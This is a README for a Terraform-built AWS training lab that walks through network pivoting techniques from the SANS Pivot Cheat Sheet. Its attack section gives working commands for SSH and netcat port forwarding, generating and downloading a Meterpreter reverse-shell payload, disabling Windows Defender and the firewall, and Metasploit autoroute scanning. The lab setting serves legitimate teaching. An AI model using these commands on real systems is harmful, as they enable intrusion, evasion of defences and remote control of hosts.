# SANS Pivot Cheat Sheet Lab
This serves as a tool for cybersecurity enthusiasts to better understand pivoting through an environment. The central reference is the [SANS Pivot Cheat Sheet](https://www.sans.org/posters/pivot-cheat-sheet/). Some code used from Terraform's [HashiCorp Learn platform](https://learn.hashicorp.com/tutorials/terraform/cloud-init?in=terraform/provision). There's also a free [SANS webcast](https://www.sans.org/webcasts/getting-the-most-out-of-the-sans-pivot-cheat-sheet-2022/) using this repo and covering the cheat sheet. Enjoy!

## Dependencies
- [AWS IAM Credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) to interact with an AWS account
- [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html) installed
- [Terraform](https://www.terraform.io/downloads.html) installed

## Files
- Readme.md:    This file explains the repository
- main.tf:      Overall architecture of the Terraform project
- variables.tf: Contains values used in production
- output.tf:    Defines outputs requested from the build
- scripts/:     YAML config files for instances
- assets/:      Files copied to instances

## Setup Steps
### Create Keys and Apply to YAML Configs
- `ssh-keygen -t rsa -C "your_email@example.com" -f ../tf-cloud-init`
- Look for `ssh_authorized_keys:` in the YAML files in `scripts/`. Replace the example public keys with the contents of your new `tf-cloud-init.pub`.  One-liner:
  - `sed -i "s:ssh-rsa.*$:$(cat ../tf-cloud-init.pub|tr -d '\n'):" ./scripts/*yaml`

### Set Default AWS Credentials
- Check to see what you have in your `~/.aws/credentials` file:
  - `cat ~/.aws/credentials`
- Set your current shell to use the right set:
  - `export AWS_PROFILE=Your-Favorite-IAM`

### Create the Range with Terraform
```
$ terraform init
[...]
Terraform has been successfully initialized!
[...]
$ terraform fmt
$ terraform validate
Success! The configuration is valid.
$ terraform apply
[...]
Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes
[...]
Apply complete! Resources: 11 added, 0 changed, 0 destroyed.

Outputs:

linux_attack_private_ip = "10.1.1.1"
linux_attack_public_ip = "18.19.20.21"
linux_pivot_private_ip = "10.1.2.1"
linux_pivot_public_ip = "3.4.5.6"
linux_target_private_ip = "10.1.3.1"
linux_target_public_ip = "1.3.3.7"
sg_pivot = "sg-0123456789abcdef0"
vpc = "vpc-0123456789abcdef0"
$ terraform show #optional - to show assets and addresses again
```

### Optionally: Create a Windows Instance as Another Pivot
- From the AWS Console, Launch Instances
- Name it _Windows-Pivot_
- Optional: add a tag like "Project:PivotPlay"
- Pick a Windows AMI - maybe Server 2022 (ami-0b9fc4f4583318dff)
- Next, then _t2micro_ is probably OK
- Create a new key and **save** them; I'll call mine _pivot-labz_
- Next, then VPC from the Terraform output
- Set Auto-Assign public IP to _Enable_
- Pick the _sg\_pivot_ security group
- Under Advanced network configuration, set Primary IP addresses to _10.1.2.2_
- Review, then _Launch instance_
- Once the new instance is up, select it in the Instances view and Connect using the key you just created to get the password
- Optionally, you can do this with the AWS CLI:
  - `aws ec2 create-key-pair --key-name pivot-labz --region us-east-2`
  - Save the private key to something like `../pivot-labz.pem` so you can get the instance password later
  - `aws ec2 describe-subnets --region us-east-2` # to get the subnet-id for the next command
  - `aws ec2 run-instances --image-id ami-0b9fc4f4583318dff --count 1 --instance-type t2.micro --key-name pivot-labz --security-group-ids sg-0123456789abcdef0 --subnet-id subnet-6e7f829e --region us-east-2`
  - Noting the instance-id created, get the password with `aws ec2 get-password-data --instance-id i-0123456789abcdef0 --priv-launch-key ../pivot-labz.pem --region us-east-2`
- Then RDP in!  `mstsc.exe`, connect as Administrator with your random password.

### Optional Windows Steps
- Install chocolatey package manager: `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))`
- Install Nmap or other tools: `choco install nmap`
- Update the hosts file: `notepad.exe C:\Windows\System32\drivers\etc\hosts`
```
10.1.1.1    linux-attack
10.1.2.1    linux-pivot
10.1.2.2    windows-pivot
10.1.3.1    linux-target
```

### Connect to the Attack Machine with the IP from the Terraform Output
- `ssh attack@AttackIPHere -i ../tf-cloud-init`
- If you've lost track of those IPs, just `terraform show` to see them again

### Confirm You _Can't_ Get to the Target
- attack $ `nmap 10.1.2.1 10.1.3.1` or `nmap linux-pivot linux-target`
- attack $ `curl linux-pivot` # succeeds!
- attack $ `curl linux-target` # fails )-:

## Attack!

### Local Port Forward
- `scp -i ../tf-cloud-init ../tf-cloud-init attack@AttackIPHere:~/.ssh` # copy private key to the attack host
- `ssh -i ../tf-cloud-init attack@AttackIPHere` # connect to the attack host
- attack $ `ssh -i .ssh/tf-cloud-init pivot@linux-pivot` # verify you have access the the pivot host
- pivot $ `exit`
- attack $ `ssh -i .ssh/tf-cloud-init -fNL 1337:linux-target:80 pivot@linux-pivot`
- attack $ `curl localhost:1337` # success!

### Dynamic Port Forward
- attack $ `ssh -i .ssh/tf-cloud-init -D 9050 -fN pivot@linux-pivot`
- attack $ `proxychains curl linux-target` # success!

### Netcat Port Forward
- attack $ `tmux`
- attack $ \<Ctrl\>b "
- attack $ `ssh -i .ssh/tf-cloud-init pivot@linux-pivot`
- pivot $ `mkfifo backpipe`
- pivot $ `nc -lvp 2000 0<backpipe | nc linux-target 80 >backpipe`
- attack $ \<Ctrl\>b \<Up arrow\>
- attack $ `curl linux-pivot:2000` # success!

### Roll Meterpreter on Windows
- attack $ `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8888 -f exe -o helper.exe` # create a payload
- attack $ `python3 -m http.server 8000` # serve it up; <Ctrl>-c later to end
- pivot PS> `Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend` # disable Defender
- pivot PS> `netsh advfirewall set allprofiles state off` # disable the host firewall
- pivot PS> `curl 10.1.1.1:8000/helper.exe -OutFile helper.exe` # grab the malware
- Build a resource file on attack $ `cat << EOF > catch8888.rc`
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST eth0
set LPORT 8888
run
EOF
```
- attack $ `msfconsole -r catch8888.rc` # start up Metasploit to catch the payload
- pivot PS> `.\helper.exe` # exploit yourself!

### Autoroute
- meterpreter > `background`
```
[*] Backgrounding session 1...
```
- msf6 > `use post/multi/manage/autoroute`
- msf6 post(multi/manage/autoroute) > `set subnet 10.1.3.0`
- msf6 post(multi/manage/autoroute) > `set session 1` # or whatever your Meterpreter session number is
- msf6 post(multi/manage/autoroute) > `run`
- msf6 post(multi/manage/autoroute) > `use auxiliary/scanner/portscan/tcp` # and now to check that it works!
- msf6 auxiliary(scanner/portscan/tcp) > `set RHOSTS linux-target`
- msf6 auxiliary(scanner/portscan/tcp) > `set PORTS 80`
- msf6 auxiliary(scanner/portscan/tcp) > `run`
```
[+] 10.1.3.1:             - 10.1.3.1:80 - TCP OPEN # success!
```

## Tear Down Steps
- Go into AWS EC2, switch to the correct region, and terminate any Windows instances.
```
$ terraform destroy
[...]
Do you really want to destroy all resources?
  Terraform will destroy all your managed infrastructure, as shown above.
  There is no undo. Only 'yes' will be accepted to confirm.

  Enter a value: yes
[...]
Destroy complete! Resources: 11 destroyed.
$ terraform show #optional - to show assets and addresses again
```
